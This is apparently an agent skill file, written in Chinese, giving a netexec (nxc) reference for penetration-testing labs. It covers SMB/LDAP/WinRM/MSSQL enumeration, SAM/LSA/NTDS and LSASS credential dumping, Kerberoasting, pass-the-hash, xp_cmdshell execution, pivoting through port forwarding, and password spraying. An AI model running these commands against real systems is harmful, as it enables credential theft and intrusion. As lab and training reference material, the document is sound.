---
name: 'netexec-reference'
description: 'netexec (nxc) 全面参考：SMB/LDAP/WinRM/MSSQL 核心命令、模块、密码喷洒、与 crackmapexec 对比。🆕 含 MSSQL `--local-auth` 假阴性、`--port` 走跳板机转发打段内主机。（检索词：netexec reference/nxc/--local-auth/local-auth/工作组认证/untrusted domain/假阴性/portproxy/端口转发/段内主机/--port/put-file/get-file)'
metadata: { domain: tools, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# netexec (nxc) — CrackMapExec 继任者全面参考

## 协议: smb / ldap / winrm / mssql / ssh / ftp / rdp / vnc / wmi

## SMB 最常用
```bash
nxc smb 10.10.10.0/24                                    # 扫描 + signing 检测
nxc smb 10.10.10.10 -u 'u' -p 'p' --shares               # 共享枚举
nxc smb 10.10.10.10 -u 'u' -p 'p' --users --groups       # 用户/组
nxc smb 10.10.10.10 -u 'u' -p 'p' --loggedon-users       # 谁登录着
nxc smb 10.10.10.10 -u 'u' -p 'p' --rid-brute            # RID 爆破用户
nxc smb 10.10.10.10 -u 'u' -p 'p' --pass-pol             # 密码策略
nxc smb 10.10.10.10 -u 'u' -p 'p' -x 'whoami'            # cmd 执行
nxc smb 10.10.10.10 -u 'u' -p 'p' --sam / --lsa / --ntds # dump
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt       # 找可 relay 主机
```

## LDAP 最常用
```bash
nxc ldap 10.10.10.10 -u 'u' -p 'p' --users --groups --computers
nxc ldap 10.10.10.10 -u 'u' -p 'p' --asreproast asrep.txt
nxc ldap 10.10.10.10 -u 'u' -p 'p' --kerberoasting kerb.txt
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M user-desc         # ⚠️ description 密码宝库
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M dmsa               # dMSA 账户
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M laps               # LAPS 密码
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M adcs               # ADCS 枚举
nxc ldap 10.10.10.10 -u 'u' -p 'p' -M daclread -o TARGET=user WRITE=true
```

## WinRM
```bash
nxc winrm 10.10.10.10 -u 'u' -p 'p'                      # 验证
nxc winrm 10.10.10.10 -u 'u' -H 'HASH'                   # PTH
nxc winrm 10.10.10.10 -u 'u' -p 'p' -x 'whoami'          # 执行
```
> ⚠️ **取决于版本**：某些 netexec 版本的 winrm `-x` 存在 Python `zip()` 相关问题（版本边界**待核实**，本机未装 netexec，无实测）。
> ✅ **不知道版本边界时用这条决策规则**：先跑一次上面这条 `nxc winrm <target> -u '<u>' -p '<p>' -x whoami`
> —— **正常回显 whoami（无 traceback / 非空）⇒ 直接用 netexec**；**报错 / 回显为空 / 出现 Python 异常 ⇒ 该版本未修，改用 evil-winrm 兜底**。不写版本号、不靠猜。
> 👉 同一问题的另一面见 `evil-winrm-path-escaping`（那里讲 evil-winrm 的路径转义与同一决策规则）。

## MSSQL
```bash
nxc mssql 10.10.10.10 -u 'sa' -p 'pass'                  # 验证
nxc mssql 10.10.10.10 -u 'u' -p 'p' --local-auth          # 🔴 非域/工作组机器必加（不加 = 走 Integrated 认证 = 假阴性）
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -M mssql_priv    # 权限检查
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -x 'whoami'      # xp_cmdshell
nxc mssql 10.10.10.10 -u 'sa' -p 'pass' --enable-xpcmdshell
```
> 🔴 🆕 **`--local-auth` 是远程 MSSQL 最容易漏的一个开关**：目标不在域里（workgroup / 主机名无域名后缀）时，
> 不加它会回 *"login is from an untrusted domain… Integrated authentication"*，**这与你试的用户名/口令无关**
> ⇒ 你会把"能用的凭据"判成"错的"，把整台机器关掉一整个会话（Dante 实测）。详见 `mssql-attack-chain` §8。

## 段内主机怎么用 nxc 打（🔴 换源问题）
```bash
# 目标段只放行某个枢纽机时：在枢纽机上做【内核级端口转发】，
# 再从 Kali 用 nxc 连本机端口 —— 这样"源"就是那台枢纽机（proxychains 会替换源 IP，不算）
nxc smb 127.0.0.1 --port 1445 -u 'u' -p 'p'      # 🔴 --port 让 nxc 连非 445 端口
```
> 🔴 `--port` 让 nxc 打自建转发端口 = 用**跳板机的源地址**打目标段；
> `--put-file` / `--get-file` 直接走 `C$` 读写，**比 `smbexec` 之类靠回显的机制可靠**（回显会丢、会截断）。

## 模块 (nxc smb -L / nxc ldap -L)
- lsassy / nanodump → dump LSASS 凭据
- spider_plus → 递归文件搜索
- slinky → 找 .vhd/.xml/.config
- ioxidresolver → 找 Web/DB config
- nopac → noPAC 漏洞检测
- wcc → Windows凭据收集器

## 密码喷洒
```bash
nxc smb 10.10.10.10 -u users.txt -p 'SinglePass!' --no-bruteforce
nxc smb 10.10.10.10 -u users.txt -p pwd.txt --continue-on-success
```

## 对比 cme
- 语法 95% 相同，直接替换 `crackmapexec` → `nxc` 或 `netexec`
- LDAP/WinRM/MSSQL 独立协议模块（cme 是靠 -M 模块凑的）
- 默认 `--continue-on-success`（cme 默认单次成功就停）
- Kali 安装: `apt install netexec` 或已有

**Why:** 一直在用 crackmapexec 老习惯，但 cme 已停止维护。netexec 有更丰富的协议支持和模块生态。
**How to apply:** 所有新靶机使用 nxc 代替 crackmapexec；SMB 扫描直接用 nxc smb（自带 signing 检测）。
